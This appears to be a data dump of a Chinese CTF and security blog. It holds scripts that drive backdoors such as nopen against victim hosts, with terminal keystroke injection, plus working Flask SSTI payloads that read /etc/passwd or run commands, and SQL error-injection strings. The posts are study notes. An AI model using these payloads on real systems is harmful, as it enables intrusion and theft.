-r tcp -t &#123;&#125; -p &#123;&#125; -a &#123;&#125; -c &#123;&#125;&#x27;.format(dip, dport, listener_ip, listener_port) p = subprocess.Popen(run_command, stdin=subprocess.PIPE, stdout=None, shell=True) time.sleep(10) with open(&#x27;command.txt&#x27;, &#x27;r&#x27;) as f: command_list = [line.strip() for line in f.readlines()] for i in range(command_number): p.stdin.write(choice(command_list) + &quot;\\n&quot;) time.sleep(0.2) time.sleep(10) 使用方法： 在tipoff同目录下新建一个command.txt文件。文件中每一行为所执行的命令。 运行程序，即可不断随机执行命令。 ```python rundewdrop.py [victim ip] [victim port] [Listener ip] [Listener port] [Number of command] 1234567891011### （2）nopennopen也是一款linux后门软件，使用方法与dewdrop类似。在靶机上运行nopen server后，可以使nopen client远程控制。然而，脚本却艰难重重。#### 1.subprocess模块我的第一选择当然是选择与dewdrop相同的方法，使用了subprocess模块。然而，却遇到了问题。nopen client出现了报错。 error: failed to open global_output_file 12345瞬间懵逼......有趣的是，这个nopen client程序还会骂人，还是骂20遍： What? are you nuts? 1234567891011#### 2.其他重定向方法我还采取了其他重定向输入方法。如&lt;，管道符|，都遇到了一模一样的问题。仿佛只要重定向就会报错。#### 3.寻找原因既然找不到原因，就直接逆向分析......动调调试了很久，找到了报错的关键之处。运行nopen client后，每输入一条命令，都会尝试去运行fdopen函数。 FILE* fdopen(int fildes,const char* mode); 12345678910111213141516171819fdopen的第一个参数为文件描述符。但是诡异的是：动调发现，运行到这里，打开的文件文件描述符为0。0正是标准输入流。打开文件成功即可继续运行。打开文件失败则报错退出。明明是在已经输入命令之后，难以理解为什么又会打开标准输入流。手动测试了fdopen这个函数。它确实能打开标准输入流，甚至向标准输入流中输出。然而一但进行重定向，这个函数就返回null。在钟sir的指导下，了解到了也存在0不是标准输入流的可能。程序是可以将0重定向到其他流的。继续逆向分析，却收效甚微......就算找到了错误的地方，也仍然不一定能找到解决方法。#### 4.termios模块伪造终端输入这是一个突发奇想，既然无法重定向输入，能否选择其他方式输入？一番搜索之下，找到了python的termios模块，可以伪造终端输入。在 Linux 中可以通过一组函数调用（通用终端接口，简称GTI）来控制终端。termios是在 POSIX 规范中定义的标准接口。python中的termios模块正是通过这个接口，从底层实现伪造终端输入。因此思路很简单：只需打开一个终端，运行nopen。再打开另一个终端，通过伪造输入向nopen所在终端输入命令，实现nopen重复的运行。脚本如下： #!/usr/bin/python import sys,os,fcntl,termiosfrom random import choiceif len(sys.argv) != 3: sys.stderr.write(“usage: ttyexec.py tty command_number\\n”) sys.exit(1)fd = os.open(“/dev/“ + sys.argv[1], os.O_RDWR)command_number = int(sys.argv[2]) with open(‘commands.txt’, ‘r’) as f: command_list = [line.strip() for line in f.readlines()] for i in range(command_number): cmd = choice(command_list) for j in range(len(cmd)): fcntl.ioctl(fd, termios.TIOCSTI, cmd[j]) fcntl.ioctl(fd, termios.TIOCSTI, &#39;\\n&#39;) os.close(fd) 1234567在我自己的环境终于测试成功！！！，然而......AI的人在docker运行出错了。---AI方向使用docker运行脚本，docker运行的过程中报错如下： IOError:[Errno 1]Operation not permitted 1234567891011明显是一个权限问题。去百度了这个问题，确实是权限不足。百度到的问题是root权限尝试修改某些特殊文件出现这个报错，原因在于文件属性。查看文件属性可以发现文件有属性i，可以确保文件不被修改。执行比chmod更底层的命令chattr，可以修改文件属性，随后便可以修改文件。然而，这对解决问题没有太大帮助。因为无法用chattr命令去修改/der/pts/tty的属性。#### 5.最终方法经历了许久，最后突然想到可以绕过这个问题。在伪造终端输入的时候，向其他终端伪造输入是需要管理员权限的，但是在运行该脚本的自身终端输入则不需要管理员权限。可以控制脚本sleep几秒，并后台运行。再打开nopen，就可以实现重复执行命令。 #!/usr/bin/python import sys,os,fcntl,termiosfrom random import choiceif len(sys.argv) != 3: sys.stderr.write(“usage: ttyexec.py tty command_number\\n”) sys.exit(1)fd = os.open(“/dev/“ + sys.argv[1], os.O_RDWR)command_number = int(sys.argv[2])sleep(10) with open(‘commands.txt’, ‘r’) as f: command_list = [line.strip() for line in f.readlines()] for i in range(command_number): cmd = choice(command_list) for j in range(len(cmd)): fcntl.ioctl(fd, termios.TIOCSTI, cmd[j]) fcntl.ioctl(fd, termios.TIOCSTI, &#39;\\n&#39;) os.close(fd) 123456789使用方法：- commands.txt 执行命令的内容（需要与ttyexec.py在同一目录下）- commands.txt每一行为需要执行的命令- ``` $ python ttyexec.py tty 100 &amp; 在同一终端运行nopen client （3）telnet实现telnet的重定向方法很多，这里采用与dewdrop相同的方法，使用subprocess模块。不同之处仅仅在于需要输入用户名和密码。 123456789101112131415161718192021222324252627282930313233343536import sysimport timeimport subprocessfrom random import choiceif __name__==&quot;__main__&quot;: #check for args, print usage if incorrect if len(sys.argv) != 5: print(&#x27;\\nUsage:\\nruntelnet.py [victim ip] [username] [passwd] [commands number]\\n&#x27;) sys.exit() dip = sys.argv[1] username = sys.argv[2] passwd = sys.argv[3] command_number = int(sys.argv[4]) run_command = &#x27;telnet &#123;&#125; &#x27;.format(dip) p = subprocess.Popen(run_command, stdin=subprocess.PIPE, stdout=None, shell=True) time.sleep(3) p.stdin.write(username) time.sleep(3) p.stdin.write(&quot;\\n&quot;) time.sleep(3) p.stdin.write(passwd) time.sleep(3) p.stdin.write(&quot;\\n&quot;) time.sleep(5) with open(&#x27;commands.txt&#x27;, &#x27;r&#x27;) as f: command_list = [line.strip() for line in f.readlines()] for i in range(command_number): p.stdin.write(choice(command_list) + &quot;\\n&quot;) p.stdin.write(str(i) + &quot;\\n&quot;) p.stdin.flush() time.sleep(0.2) time.sleep(3) p.stdin.write(&quot;exit\\n&quot;) 使用方法： 运行环境python2 需要在同一目录新建一个commands.txt，commands.txt中每一行为所需执行的命令。 运行命令 1$ python runtelnet.py &#123;ip地址&#125; &#123;用户名&#125; &#123;密码&#125; &#123;发包个数&#125; 已解决发包次数过多后断开的问题。（脚本中每执行一条命令后sleep 0.2秒） （4）sshssh会自动检测输入是否被重定向。 1Pseudo-terminal will not be allocated because stdin is not a terminal 可以使用-tt强制分配为伪终端，即使标准输入不是终端。尽管如此，ssh的密码依然无法通过重定向输入，需要手动输入。 12345678910111213141516171819202122232425262728import sysimport timeimport subprocessfrom random import choiceif __name__==&quot;__main__&quot;: #check for args, print usage if incorrect if len(sys.argv) != 3: print(&#x27;\\nUsage:\\nrunssh.py [victim ip] [commands number]\\n&#x27;) sys.exit() dip = sys.argv[1] command_number = int(sys.argv[2]) run_command = &#x27;ssh -tt &#123;&#125; &#x27;.format(dip) p = subprocess.Popen(run_command, stdin=subprocess.PIPE, stdout=None, shell=True) time.sleep(3) p.stdin.write(&quot;\\n&quot;) time.sleep(5) with open(&#x27;commands.txt&#x27;, &#x27;r&#x27;) as f: command_list = [line.strip() for line in f.readlines()] for i in range(command_number): p.stdin.write(choice(command_list) + &quot;\\n&quot;) p.stdin.write(str(i) + &quot;\\n&quot;) p.stdin.flush() time.sleep(0.2) time.sleep(10) p.stdin.write(&quot;exit\\n&quot;) 使用方法： 运行环境 python2 需要在本目录新建一个commands.txt，commands.txt中每行为所需要执行的命令。 运行命令 1$ python runssh.py &#123;目标ip&#125; &#123;执行命令个数&#125; 执行后需要手动输入靶机密码。输入密码后程序自动继续运行。 已解决发包次数过多后断开的问题。（脚本中每执行一条命令后sleep 0.2秒）","categories":[{"name":"Dian","slug":"Dian","permalink":"http://example.com/categories/Dian/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"重定向","slug":"重定向","permalink":"http://example.com/tags/%E9%87%8D%E5%AE%9A%E5%90%91/"}]},{"title":"unicode的小把戏","slug":"unicode的小把戏","date":"2020-08-24T13:19:12.000Z","updated":"2021-06-06T06:29:22.241Z","comments":true,"path":"2020/08/24/unicode的小把戏/","link":"","permalink":"http://example.com/2020/08/24/unicode%E7%9A%84%E5%B0%8F%E6%8A%8A%E6%88%8F/","excerpt":"UnicodeUnicode是计算机科学领域里的一项业界标准，它为每种语言中的每个字符设定了统一并且唯一的二进制编码。 下面来说一说一些unicode的trick","text":"UnicodeUnicode是计算机科学领域里的一项业界标准，它为每种语言中的每个字符设定了统一并且唯一的二进制编码。 下面来说一说一些unicode的trick QQ聊天小尾巴（仅限手机端） 最近见到有些人的昵称后面加了个喵~，一开始还以为只是卖萌，后来才发现奇怪之处。在QQ界面可以看到QQ群消息的最近一条消息以及发出消息的人名，但是这些喵~却诡异地移动到了所发消息之后 看起来诡异，但是一猜就是unicode。 究竟是怎么回事？先看看他的群名 1Void‮～喵‭ 转成unicode 12&amp;#86;&amp;#111;&amp;#105;&amp;#100;&amp;#8238;&amp;#65374;&amp;#21941;&amp;#8237;//V o i d ~ 喵 搜一下这些unicode的含义，是正常字符的就不说了，重点是两个不可见字符。 这两个均为控制字符。其中， RLO(&amp;#8238;)为从右至左优先，强制字符成为从右到左字符串。 LRO(&amp;#8237;)为从左至右优先，强制字符成为从左到右字符串。 这就是小尾巴的奥秘所在。当然，在读取文字编码时，读到&amp;#8238;时，强制从右到左，后面的文字会在本行从右向左显示。当读到&amp;#8237;时，又回归正常的从左向右，不会后面影响正常的文字。 当然，这种小尾巴的缺点在于，别人@你时，他所发的文字如果与&amp;#8238;在同一行，文字的内容可能会被翻转。但是仅对这一行有效。","categories":[{"name":"misc","slug":"misc","permalink":"http://example.com/categories/misc/"}],"tags":[{"name":"unicode","slug":"unicode","permalink":"http://example.com/tags/unicode/"}]},{"title":"flask模板注入","slug":"flask模板注入（一）","date":"2020-08-16T10:07:48.000Z","updated":"2021-06-06T06:36:07.247Z","comments":true,"path":"2020/08/16/flask模板注入（一）/","link":"","permalink":"http://example.com/2020/08/16/flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"Flask模板注入（一）Flask中使用了Jinja2作为模板渲染引擎，Jinja2会将{{}}中包裹的内容当作变量解析替换。当服务器接受了用户的输入并将其作为模板的一部分，在渲染的过程中就可能渲染了用户插入的恶意内容，导致敏感信息泄露甚至代码执行。 1、实现模板注入1.1 基础知识（1）_class_ 获取当前实例的类对象1234&gt;&gt;&gt; &#x27;&#x27;.__class__&lt;type &#x27;str&#x27;&gt; //空字符串是一个实例，对应的类是&lt;type &#x27;str&#x27;&gt; &gt;&gt;&gt; [].__class__&lt;type &#x27;list&#x27;&gt; //空列表串是一个实例，对应的类是&lt;type &#x27;list&#x27;&gt; （2）_base_ 获取当前类的一个继承类123456&gt;&gt;&gt; [].__class__.__base__&lt;type &#x27;object&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__&lt;type &#x27;basestring&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__base__.__base__&lt;type &#x27;object&#x27;&gt; //在python2.7中大部分类都继承了object类 （3）_mro_ 获取当前类的所有继承类1234&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__(&lt;type &#x27;str&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;object&#x27;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;type &#x27;list&#x27;&gt;, &lt;type &#x27;object&#x27;&gt;) （4）_subclasses_() 获取当前类的所有继承类列表1234&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[40]&lt;type &#x27;file&#x27;&gt; //object的第40个子类//python2和python3的不同版本在object的子类中有较大不同 （5）_init_ 用于将对象实例化（6）_dict_ 用于列出当前属性/函数的字典12345&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].os&lt;module &#x27;os&#x27; from &#x27;D:\\python2.7\\lib\\os.pyc&#x27;&gt;&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;]&lt;module &#x27;os&#x27; from &#x27;D:\\python2.7\\lib\\os.pyc&#x27;&gt;\\\\这里感觉没有什么区别 （7） _getitem_1234567&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__(&lt;type &#x27;str&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;object&#x27;&gt;)&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__.__getitem__(1)&lt;type &#x27;basestring&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__.__getitem__(2)&lt;type &#x27;object&#x27;&gt; （8）func_globals 返回一个包含函数全局变量的字典引用（9）_globals_ 对保存函数全局变量(定义函数的模块的全局名称空间)的字典的引用。1.2 实现恶意命令注入（1）文件读取在object的所有子类中可以找到file类 1234&gt;&gt;&gt; object.__subclasses__()[40]&lt;type &#x27;file&#x27;&gt;&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[40]&lt;type &#x27;file&#x27;&gt; //object的第40个子类一般为file 故可以进行文件读取 123&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[40](&#x27;/etc/passwd&#x27;)&gt;&gt;&gt; &#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read() （2）命令执行-方法1包含os模块的两个类： 123&gt;&gt;&gt; object.__subclasses__()[72]&lt;class &#x27;site._Printer&#x27;&gt; //这里环境该类位于object的第72个子类。但环境不同位置可能不同&lt;class &#x27;site.Quitter&#x27;&gt; //这里环境该类位于object的第77个子类。但环境不同位置可能不同 实现命令执行的payload 12345&gt;&gt;&gt; object.__subclasses__()[72].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)&gt;&gt;&gt; object.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].system(&#x27;ls&#x27;)//在注入时，直接使用system函数可能导致无回显，故可以使用popen函数&gt;&gt;&gt; object.__subclasses__()[72].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&gt;&gt;&gt; object.__subclasses__()[77].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() （3）命令执行-方法2利用warnings.catch_warnings模块 12&gt;&gt;&gt; object.__subclasses__()[60]&lt;class &#x27;warnings.catch_warnings&#x27;&gt; //这里环境该类位于object的第60个子类。但环境不同位置可能不同 实现命令执行 1&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].os.popen(&#x27;whoami&#x27;).read() 再补充一些payload 1234567&gt;&gt;&gt; object.__subclasses__()[60].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;po&#x27;+&#x27;pen&#x27;](&#x27;whoami&#x27;).read()&#x27;laptop-91trpmfu\\\\admin\\n&#x27;\\\\利用__dict__可以绕过某些黑名单&gt;&gt;&gt; object.__subclasses__()[60].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;)&#x27;laptop-91trpmfu\\\\admin\\n&#x27;\\\\使用eval （4）遍历找到catch_warnings的payload1234//执行命令&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;//读文件&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 2、附录2.1 一些任意代码执行及读取文件函数（1）os执行系统命令12import osos.system(&#x27;ipconfig&#x27;) （2）exec 任意代码执行1exec(&#x27;__import__(&quot;os&quot;).system(&quot;ipconfig&quot;)&#x27;) （3）eval 任意代码执行1eval(&#x27;__import__(&quot;os&quot;).system(&quot;ipconfig&quot;)&#x27;) （4）timeit 本是检测性能的，也可以任意代码执行12import timeittimeit.timeit(&quot;__import__(&#x27;os&#x27;).system(&#x27;ipconfig&#x27;)&quot;,number=1) （5）platform12import platformplatform.popen(&#x27;ipconfig&#x27;).read() （6）subprocess12import subprocesssubprocess.Popen(&#x27;ipconfig&#x27;, shell=True, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read() （7）file1file(&#x27;/etc/passwd&#x27;).read() （8）open1open(&#x27;/etc/passwd&#x27;).read() （9）codecs12import codecscodecs.open(&#x27;/etc/passwd&#x27;).read() 3、然而……这只是基础后续会相继补上： flask模板注入（2） 参考链接python 模板注入 Flask模板注入 FLASK模板注入（SSTI） Flask/Jinja2 SSTI &amp;&amp; python 沙箱逃逸 还有一个基础而重要的 python _globals, _file","categories":[{"name":"CTF-web","slug":"CTF-web","permalink":"http://example.com/categories/CTF-web/"}],"tags":[{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"CTF-web","slug":"CTF-web","permalink":"http://example.com/tags/CTF-web/"},{"name":"SSTI","slug":"SSTI","permalink":"http://example.com/tags/SSTI/"}]},{"title":"报错注入","slug":"报错注入","date":"2020-07-10T14:04:51.000Z","updated":"2021-06-06T06:31:52.162Z","comments":true,"path":"2020/07/10/报错注入/","link":"","permalink":"http://example.com/2020/07/10/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","excerpt":"","text":"报错注入之前都是做题中积累经验，感觉自己的基础薄弱。大部分时候都是看别人的WP才能做题。最近在看一本《CTF训练营》，补一补基础，做笔记。 报错注入的条件 可回显 回显有报错信息 过滤不严格（希望WAF不行） 绕过是个麻烦事儿，这里暂且假设没有任何过滤。 报错注入使用的函数updatexml()1234UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document，String格式，为XML文档对象的名称第二个参数：XPath_string (Xpath格式的字符串) 第三个参数：new_value，String格式，替换查找到的符合条件的数据 updatexml()的第二个参数为Xpath格式的字符串，当其不属于Xpath语法时就会报错，报错内容显示出该参数不符合Xpath语法。 12mysql&gt; SELECT updatexml(1, concat(Ox7e,(SELECT version()),0x7e),1);ERROR 1105 (HY00O): XPATH syntax error: &#x27; -5.6.26~ &#x27; #成功爆出数据库版本 于是，通过改变updatexml()的第二个参数，可以执行SQL语句查数据库、查表、等等。 extractvalue()123EXTRACTVALUE (XML_document, XPath_string); 第一个参数：XML_document是String格式，为XML文档对象的名称第二个参数：XPath_string (Xpath格式的字符串) extractvalue()从XML中返回包含查询值的字符串。通过extractvalue()实现报错注入的原理与updatexml()十分类似。都是通过参数不符合Xpath的语法，实现报错注入。 12mysql&gt; SELECT 1,2 and extractvalue(1,concat(Ox7e,(SELECT version()),0x7e));ERROR 1105 (HY00O): XPATH syntax error: &#x27; -5.6.26~ &#x27; #成功爆出数据库版本 floor()floor()函数只有一个参数。 floor函数的作用是返回小于等于该值的最大整数，即向下取整，只保留整数部分。 123?id=1&#x27;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_ schema.tables limit 0,1),floor(rand(0)*2))x from information_ schema.tables group by x)a)%23#来源于《CTF训练营》 可爆出数据库版本。 exp()exp()函数只有一个参数。 此函数返回e(自然对数的底)指数X的幂值。但是当传递的参数大于709时，就会发生溢出错误。 正确执行函数返回0，对0按位取反可以得到很大的数“18446744073709551615”，故可以构造注入语句。 1id=1&#x27; an exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)); 参考链接SQL注入 | exp()函数报错 《CTF训练营》","categories":[{"name":"CTF-web","slug":"CTF-web","permalink":"http://example.com/categories/CTF-web/"}],"tags":[{"name":"CTF-web","slug":"CTF-web","permalink":"http://example.com/tags/CTF-web/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]}],"categories":[{"name":"flask","slug":"flask","permalink":"http://example.com/categories/flask/"},{"name":"Dian","slug":"Dian","permalink":"http://example.com/categories/Dian/"},{"name":"misc","slug":"misc","permalink":"http://example.com/categories/misc/"},{"name":"CTF-web","slug":"CTF-web","permalink":"http://example.com/categories/CTF-web/"}],"tags":[{"name":"VPN","slug":"VPN","permalink":"http://example.com/tags/VPN/"},{"name":"flask","slug":"flask","permalink":"http://example.com/tags/flask/"},{"name":"jinja2","slug":"jinja2","permalink":"http://example.com/tags/jinja2/"},{"name":"python","slug":"python","permalink":"http://example.com/tags/python/"},{"name":"嗅探","slug":"嗅探","permalink":"http://example.com/tags/%E5%97%85%E6%8E%A2/"},{"name":"C","slug":"C","permalink":"http://example.com/tags/C/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"重定向","slug":"重定向","permalink":"http://example.com/tags/%E9%87%8D%E5%AE%9A%E5%90%91/"},{"name":"unicode","slug":"unicode","permalink":"http://example.com/tags/unicode/"},{"name":"CTF-web","slug":"CTF-web","permalink":"http://example.com/tags/CTF-web/"},{"name":"SSTI","slug":"SSTI","permalink":"http://example.com/tags/SSTI/"},{"name":"SQL注入","slug":"SQL注入","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"}]}